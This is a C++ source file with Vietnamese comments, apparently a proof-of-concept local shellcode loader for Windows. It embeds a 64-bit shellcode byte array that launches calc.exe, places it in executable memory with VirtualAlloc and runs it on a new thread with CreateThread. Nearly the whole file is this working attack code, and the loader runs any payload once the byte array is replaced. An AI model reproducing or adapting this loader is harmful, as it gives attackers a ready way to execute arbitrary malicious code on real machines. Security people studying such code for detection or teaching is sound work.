#include <windows.h>
#include <iostream>
#include <string>
using namespace std;

// ============================================================================
// SHELLCODE - MỞ CALC.EXE (64-bit)
// ============================================================================

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int shellcodeSize = sizeof(shellcode) - 1;

// ============================================================================
// CẤU TRÚC KẾT QUẢ
// ============================================================================

struct InjectionResult {
    bool success;
    void* memory;
    HANDLE hThread;
    DWORD threadId;
    DWORD lastError;
    const char* errorMsg;
};

// ============================================================================
// HÀM KHỞI TẠO
// ============================================================================

void InitResult(InjectionResult* result) {
    result->success = false;
    result->memory = NULL;
    result->hThread = NULL;
    result->threadId = 0;
    result->lastError = 0;
    result->errorMsg = "Unknown";
}

// ============================================================================
// HÀM KIỂM TRA HANDLE HỢP LỆ
// ============================================================================

bool IsValidHandle(HANDLE h) {
    return (h != NULL && h != INVALID_HANDLE_VALUE);
}

// ============================================================================
// HÀM IN SHELLCODE INFO
// ============================================================================

void PrintShellcodeInfo() {
    cout << "[+] Shellcode size: " << shellcodeSize << " bytes" << endl;
    cout << "[+] First 16 bytes: ";
    for (int i = 0; i < 16 && i < shellcodeSize; i++) {
        cout << hex << (int)(unsigned char)shellcode[i] << " ";
    }
    cout << dec << endl;
}

// ============================================================================
// HÀM THỰC THI SHELLCODE (KHÔNG CHỜ THREAD)
// ============================================================================

bool ExecuteShellcode(InjectionResult* result) {
    cout << "\n[+] Step 1: Allocating memory..." << endl;

    // Bước 1: Cấp phát bộ nhớ
    result->memory = VirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (result->memory == NULL) {
        result->lastError = GetLastError();
        result->errorMsg = "VirtualAlloc failed";
        cout << "[!] VirtualAlloc failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Memory allocated at: 0x" << hex << result->memory << dec << endl;

    // Bước 2: Copy shellcode
    cout << "[+] Step 2: Copying shellcode..." << endl;
    memcpy(result->memory, shellcode, shellcodeSize);

    // Verify copy
    unsigned char firstByte = *((unsigned char*)result->memory);
    if (firstByte != shellcode[0]) {
        result->errorMsg = "Shellcode copy verification failed";
        cout << "[!] Copy verification failed!" << endl;
        VirtualFree(result->memory, 0, MEM_RELEASE);
        result->memory = NULL;
        return false;
    }

    cout << "[+] Shellcode copied and verified." << endl;

    // Bước 3: Tạo thread
    cout << "[+] Step 3: Creating thread..." << endl;
    result->hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)result->memory,
        NULL,
        0,
        &result->threadId
    );

    if (!IsValidHandle(result->hThread)) {
        result->lastError = GetLastError();
        result->errorMsg = "CreateThread failed";
        cout << "[!] CreateThread failed. Error: " << result->lastError << endl;

        if (result->memory != NULL) {
            VirtualFree(result->memory, 0, MEM_RELEASE);
            result->memory = NULL;
        }
        return false;
    }

    cout << "[+] Thread created successfully. Thread ID: " << result->threadId << endl;

    // Bước 4: KHÔNG CHỜ THREAD - để nó chạy ngầm
    // Vì shellcode mở calc.exe và chạy vĩnh viễn, không cần chờ
    cout << "[+] Step 4: Thread is running (not waiting)." << endl;
    cout << "[+] Shellcode execution initiated." << endl;

    // Bước 5: Dọn dẹp - KHÔNG ĐÓNG HANDLE
    // Không close handle vì thread đang chạy
    // Không free memory vì thread đang dùng
    cout << "[+] Step 5: Keeping thread and memory alive." << endl;

    result->success = true;
    result->errorMsg = "Success";
    return true;
}

// ============================================================================
// MAIN
// ============================================================================

int main() {
    cout << "============================================================" << endl;
    cout << "  LOCAL CODE INJECTION - NO WAIT" << endl;
    cout << "============================================================" << endl;

    PrintShellcodeInfo();
    cout << "============================================================" << endl;

    InjectionResult result;
    InitResult(&result);

    if (ExecuteShellcode(&result)) {
        cout << "\n============================================================" << endl;
        cout << "  [SUCCESS] Shellcode executed!" << endl;
        cout << "  [+] Check if Calculator opened." << endl;
        cout << "  [+] Thread is running in background." << endl;
        cout << "============================================================" << endl;
    }
    else {
        cout << "\n============================================================" << endl;
        cout << "  [FAILED] Shellcode execution failed!" << endl;
        cout << "  [+] Error: " << result.errorMsg << endl;
        if (result.lastError != 0) {
            cout << "  [+] Code: 0x" << hex << result.lastError << dec << endl;
        }
        cout << "============================================================" << endl;
    }

    cout << "\nPress Enter to exit..." << endl;
    cin.get();

    return 0;
}